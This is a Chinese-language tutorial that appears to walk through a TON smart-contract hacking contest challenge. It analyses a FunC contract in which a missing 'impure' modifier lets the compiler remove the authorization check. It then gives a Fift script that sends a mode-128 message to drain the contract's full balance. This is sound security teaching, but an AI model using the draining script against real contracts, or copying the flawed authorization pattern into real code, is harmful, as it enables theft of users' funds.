# 如何入侵簡單的 TON 區塊鏈智能合約

![hack smart contract for TON](./img/1.jpg)

## 介紹

在本文中，我們將分析如何入侵 TON 網路中的一個簡單智能合約。不用擔心，如果你不知道什麼是 TON 或如何撰寫智能合約，本文將對智能合約開發的專家和初學者進行詳細分析和解說。

### 什麼是 TON？

TON 是由 Telegram 團隊開發的一個去中心化支援的區塊鏈平台。2019 年，Telegram 團隊收到美國證券交易委員會的禁令，禁止發行其加密貨幣，使得開發工作無法繼續，但 TON 被“移交”給獨立的開源社區 The Open Network。目前它擁有超快的交易速度，排名靠前的應用程序增強功能和環保特性。

![TON](./img/2.jpg)

TON 技術網絡是一個虛擬機 [TVM](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview)。TVM 允許你執行一些代碼。應用開發者將程序載入 TVM 框架中，並且網絡中的應用是由智能合約實現的。

在本文中，我們將分析一個簡單的智能合約，該合約允許用戶進行相互資金管理。

### Actor 模型

Actor 模型是一種計算模型，是 TON 智能合約的基礎。在這個模型中，每個智能合約可以接收一條消息、更改狀態或在一段時間內發送一條或多條消息。需要注意的是，智能合約有自己的餘額。

### 什麼是黑客攻擊

由於智能合約在 Actor 模型中通過消息進行“通信”，如果發生入侵，則消息會將智能合約的所有餘額轉移到攻擊者的地址。

### FunC 和 Fift

TON 智能合約保證 TON 區塊鏈的穩定運行。開發智能合約有兩種語言：低級語言 Fift 和高級語言 FunC。

TON 經常舉辦各種競賽，包括合約開發和破解比賽，我們將分析其中一個比賽中的智能合約。

> 如果你想了解 TON，我建議你參加免費的課程和遊戲，詳情請參見 [link](https://github.com/romanovichim/TonFunClessons_eng)。

### 分析方法

首先，我們將快速查看智能合約並進行初步分析。如果你對 TON 網絡不熟悉，可以直接跳到詳細分析部分。

## 快速分析

在分析如何入侵合約之前，我們先來簡要了解這個智能合約的運作。

### 智能合約解析

這個智能合約實現了以下邏輯：

該合約是一個非常簡化的互助基金，允許兩個人通過向合約發送消息來管理合約餘額。

> 在 TON 智能合約的 Actor 模型中，每個智能合約可以接收一條消息、更改其狀態或在一段時間內發送一條或多條消息，因此通過消息進行交互。

![Smart contract](./img/3.jpg)

合約的存儲中包含兩個地址，當發送消息時，合約會檢查消息是否來自這兩個地址之一（某種授權），然後將消息體放入寄存器 c5（輸出操作寄存器），從而允許你管理智能合約的資金。

智能合約代碼：

```func
{-

  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  Contract contains intentional bugs, do not use in production

-}

#include "stdlib.func";

;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

() execute (cell) impure asm "c5 POPCTR";

global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
  addr1 = ds~load_msg_addr();
  addr2 = ds~load_msg_addr();
}

() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

讓我們逐段分析代碼，首先是智能合約的輔助函數，用於處理智能合約的存儲，`load_data()` 函數將兩個地址從 `c4` 加載到全局變量 `addr1` 和 `addr2`。假設智能合約的邏輯只能由這些地址啟動。

```func
#include "stdlib.func";

;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
  addr1 = ds~load_msg_addr();
  addr2 = ds~load_msg_addr();
}
```

接下來是 `recv_internal()` 方法，它首先檢查消息是否為空，略過消息標誌，並從消息中提取發送者的地址：

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();
}
```

接下來，我們從存儲中獲取地址，並檢查智能合約消息的發送者地址是否與存儲中的地址之一匹配。

```func
() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	}
```
這裡就是漏洞所在，`authorize()` 函數缺少 `impure` 修飾符會導致編譯器將其刪除，因為根據文檔：

`impure` 修飾符表示函數可能會產生一些不應被忽略的副作用。例如，如果函數可以修改合約存儲、發送消息或在某些數據無效時拋出異常，我們必須指定 `impure` 修飾符。如果未指定 `impure` 且函數調用結果未被使用，則 FunC 編譯器可以且將會移除該函數調用。

在智能合約的結尾，消息體被寫入輸出操作寄存器 `c5`。因此，要入侵合約，我們只需發送一條消息，該消息將從智能合約中提取 Toncoin 加密貨幣。

```func
() execute (cell) impure asm "c5 POPCTR";

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

### 入侵消息解析

要發送消息，我們需要撰寫一個 fift 腳本（這將為我們提供一個要發送到 TON 網絡的細胞結構），讓我們從消息體開始，為此我們需要 `<b b>`。

```fift
"TonUtil.fif" include
<b  b> =: message
```

根據文檔，消息本身可能如下所示（以下代碼為 FunC）：

```func
var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(addr)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_slice(message_body)
.end_cell();
```

因此，我們在消息體中填寫要提取 Toncoin 的地址，將金額設為 0 Gram，消息體中不寫任何內容，結果如下：

```fift
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message
```

但是，在寄存器 `c5` 中需要放置的不是消息，而是該消息所需的操作。我們將使用 `SENDRAWMSG` 發送消息。

首先，我們來了解如何將數據存儲在 `c5` 寄存器中。根據 [這裡](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=result-of-tvm-execution) 的文檔，這是一個細胞，包含指向上一個操作的鏈接和最後一個操作。我們沒有上一個操作，所以將會有一個空的 `Builder`。

```fift
<b <b b> ref, 這裡會有發送消息的 ref, b>
```

接下來是 `SENDRAWMSG`，我們從 [這裡的 371 行](https://github.com/ton-blockchain/ton/blob/d01bcee5d429237340c7a72c4b0ad55ada01fcc3/crypto/block/block.tlb) 中獲取函數“代碼”，並查看 [TVM 文檔第 137 頁](https://ton-blockchain.github.io/docs/tvm.pdf) 中應該收集的參數：

- 函數“代碼”：0x0ec3c86d 32 u
- 消息發送模式，我們的情況是 128，因為我們希望提取所有資金 128 8 u
- 消息體

> x u - 無符號整數 x

結果如下：

```fift
<b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b>
```

現在將這些全部包裝在一個構建器中，因為我們需要一個消息的細胞：

```fift
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message

<b <b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b> ref, b>
```

### 如何發送消息？

TON 有幾個方便的選項來發送 `internal` 消息，第一個是通過 [toncli](https://github.com/disintar/toncli) 發送：

> toncli - 方便的命令行界面

1) 首先我們組裝 fift 腳本，這已經完成
2) 使用 `toncli send` 命令

有圖片的教程）[這裡](https://github.com/disintar/toncli/blob/master/docs/advanced/send_fift_internal.md)。

第二個方便的選項是 Go 庫 tonutils-go，如何使用 tonutils-go 發送消息，可參見我的 [之前的課程](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/14lesson/wallet_eng.md)。

## 詳細分析

### 解析互助基金合約代碼

#### 智能合約存儲

讓我們從智能合約的“存儲”解析代碼，智能合約的永久數據存儲在 TON 網絡中的 c4 寄存器中。

> 更多關於寄存器的信息，請參見 [這裡](https://ton-blockchain.github.io/docs/tvm.pdf) 的第 1.3 段

為了方便，我們會在合約中註明我們會存儲什麼，我們會存儲兩個地址（`addr1` 和 `addr2`）：

```func
;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;
```

> ;; 兩個分號為單行註釋語法

##### 輔助函數框架

為了方便操作存儲，我們會撰寫一個輔助函數來卸載數據，首先我們宣告它：

```func
() load_data () impure {

}
```

> `impure` 是一個關鍵字，表示函數會更改智能合約數據。如果函數可以修改合約存儲、發送消息或在某些數據無效時拋出異常，我們必須指定 `impure` 修飾符。**重要**：如果未指定 `impure` 且函數調用結果未被使用，則 FunC 編譯器可能會移除該函數調用。

##### 全局變量和數據類型

在這個智能合約中，假設地址將存儲在類型為 `slice` 的全局變量中。TON 中有四種主要類型：

在我們的簡單智能合約中，我們將使用以下四種類型：

- Cell (cell) - TVM 細胞，包含 1023 位數據和最多 4 個指向其他細胞的鏈接
- Slice (slice) - TVM 細胞的部分表示，用於解析細胞中的數據
- Builder - 部分構建的細胞，包含最多 1023 位數據和最多四個鏈接；可用於創建新細胞
- Integer - 有符號的 257 位整數

更多關於 FunC 類型的信息：
[簡略介紹](https://ton-blockchain.github.io/docs/#/smart-contracts/)
[詳細介紹第 2.1 段](https://ton-blockchain.github.io/docs/fiftbase.pdf)

簡單來說，cell 是密封的細胞，slice 是可以讀取細胞的部分表示，而 builder 是用來組裝細胞的。

要使變量 [全局](https://ton-blockchain.github.io/docs/#/func/global_variables?id=global-variables)，需要添加 `global` 關鍵字。

讓我們宣告兩個類型為 `slice` 的地址：

```func
global slice addr1;
global slice addr2;

() load_data () impure {

}
```

現在在輔助函數中，我們將從寄存器中獲取地址並傳遞給全局變量。

##### 在 TON 中存儲數據或寄存器 c4

為了從 c4 獲取數據，我們需要使用來自 [FunC 標準庫](https://ton-blockchain.github.io/docs/#/func/stdlib) 的兩個函數。

即：
`get_data` - 從 c4 寄存器獲取一個細胞。
`begin_parse` - 將細胞轉換為 slice

讓我們將這個值傳遞給 slice ds：

```func
global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
}
```

##### 上傳地址

從 ds 中加載地址，使用 `load_msg_addr()` - 從 slice 中加載唯一前綴為有效 MsgAddress。我們有兩個地址，因此我們加載兩次。

> `load_msg_addr()` 是標準庫的函數，所以別忘了使用 [include](https://ton-blockchain.github.io/docs/#/func/compiler_directives?id=include) 指令包含庫文件

```func
#include "stdlib.func";

;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
  addr1 = ds~load_msg_addr();
  addr2 = ds~load_msg_addr();
}
```

#### 智能合約的“主體”

為了使智能合約實現任何邏輯，它必須有可供訪問的方法。

##### 保留的方法

TON 網絡中的智能合約有兩個保留的方法可以被調用。

首先是 `recv_external()`，當來自外部世界的請求進入合約時，執行該函數，即不是來自 TON 內部，例如，當我們自己形成一個消息並通過 lite-client 發送時（關於安裝 lite-client）。第二是 `recv_internal()`，當 TON 內部的任何合約調用我們的合約時執行該函數。

lite-client 是一種軟體，它連接到完整節點以與區塊鏈交互。它們幫助用戶訪問和與區塊鏈交互，而無需同步整個區塊鏈。

這個智能合約使用 `recv_internal()`：

```func
() recv_internal (in_msg_full, in_msg_body) {

}
```

這裡應該出現一個問題，什麼是 `in_msg_full`，`in_msg_body`。
根據 [TON 虛擬機 - TVM](https://ton-blockchain.github.io/docs/tvm.pdf) 的文檔，當某個帳戶在 TON 鏈中的某個事件觸發時，會觸發一次交易。

每筆交易最多由 5 個階段組成。更多詳情見 [這裡](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases)。

我們感興趣的是 **計算階段**。具體來說，是初始化時的“堆棧”狀態。對於正常的消息觸發的交易，堆棧的初始狀態如下：

5 個元素：
- 智能合約餘額（以 nanoTons 為單位）
- 進入消息餘額（以 nanoTons 為單位）
- 包含進入消息的 cell
- 進入消息體，類型為 slice
- 函數選擇器（對於 recv_internal 是 0）

在這個智能合約的邏輯中，我們不需要餘額等，因此將 cell 與進入消息和消息體寫作參數。

##### 填充方法 - 檢查空消息

在 `recv_internal()` 中，我們首先檢查是否是空消息。如果是空消息，我們將使用 `slice_empty()` 檢查（標準庫函數，[文檔描述連結](https://ton-blockchain.github.io/docs/#/func/stdlib?id=slice_empty)），如果是空消息，則用 `return()` 結束智能合約。

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
}
```

下一步是從完整消息中獲取地址，但在我們“獲取地址”之前，需要解析消息。

為了獲取地址，我們需要使用 `begin_parse` 將 cell 轉換為 slice：

```func
slice cs = in_msg_full.begin_parse();
```

##### 讀取消息 - 略過標誌

現在我們需要“減去”獲取的 slice 以獲取地址。使用 `load_uint` 函數從 [FunC 標準庫](https://ton-blockchain.github.io/docs/#/func/stdlib) 中載入無符號 n 位整數，“略過”標誌。

```func
int flags = cs~load_uint(4);
```

在本課中，我們不會詳細討論標誌，但你可以在 [3.1.7 段](https://ton-blockchain.github.io/docs/tblkch.pdf) 中閱讀更多內容。

獲取標誌後，我們會忽略我們不感興趣的彈回消息：

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
}
```

##### 獲取發送者地址

最後，我們可以從消息中獲取發送者地址，使用已經熟悉的 `load_msg_addr()` 並立即使用我們之前撰寫的輔助函數從 `c4` 寄存器中加載地址：

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();

}
```

##### “授權”

現在，在進入智能合約的邏輯之前，我們應該檢查發送者地址是否為存儲中的第一或第二個地址，也就是說，我們將確保只有智能合約的所有者才能執行後續邏輯。為此，我們會撰寫輔助函數 `authorize()`：

```func
() authorize (sender) inline {

}
```

`inline` 修飾符將函數的內容直接放入父函數的代碼中。

如果收到的消息不是來自我們的兩個地址之一，我們將拋出異常並結束智能合約的執行。為此，我們將使用 [內建函數](https://ton-blockchain.github.io/docs/#/func/builtins) 來拋出異常。

##### 異常

可以通過條件原語 `throw_if` 和 `throw_unless` 拋出異常，無條件的異常使用 `throw`。

我們使用 `throw_if` 並傳遞任意錯誤代碼。

```func
() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}
```

> `equal_slice_bit` - 標準庫函數，用於檢查相等性

##### 允許入侵合約的錯誤

看起來好像沒問題，但這裡的錯誤允許入侵智能合約 - 由於缺少 `impure` 修飾符，這個函數在編譯時將被刪除。

根據文檔：

`impure` 修飾符表示函數可能會產生一些不應被忽略的副作用。例如，如果函數可以修改合約存儲、發送消息或在某些數據無效時拋出異常，我們必須指定 `impure` 修飾符。如果未指定 `impure` 且函數調用結果未被使用，則 FunC 編譯器可以且將會移除該函數調用。

這就是為什麼這個合約存在漏洞 - 授權在編譯時將會消失。

##### 合約邏輯

儘管發現了漏洞，我們還是把合約分析到底：從消息體中獲取包含請求的細胞：

```func
cell request = in_msg_body~load_ref();
```

> load_ref() - 從 slice 中加載第一個鏈接。

最後一步，`execute()` 函數：

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

##### 填充寄存器 c5

FunC 支持以彙編語言（即 Fift）定義函數。這樣的定義如下 - 我們將函數定義為低級 TVM 原語。在我們的情況下：

```func
() execute (cell) impure asm "c5 POPCTR";
```

如你所見，使用了 `asm` 關鍵字。

POPCTR c(i) - 從堆棧中彈出 x 的值並將其存儲在控制寄存器 c(i) 中，

你可以在 [TVM 文檔第 77 頁](https://ton-blockchain.github.io/docs/tvm.pdf) 查看可能的原語列表。

##### 寄存器 c5

寄存器 `c5` 包含輸出操作。因此，我們可以在這裡放置一條消息，將資金提取出來。

## 結論

我會在我的頻道 https://t.me/ton_learn 上發布類似的教程和分析。希望你的訂閱！

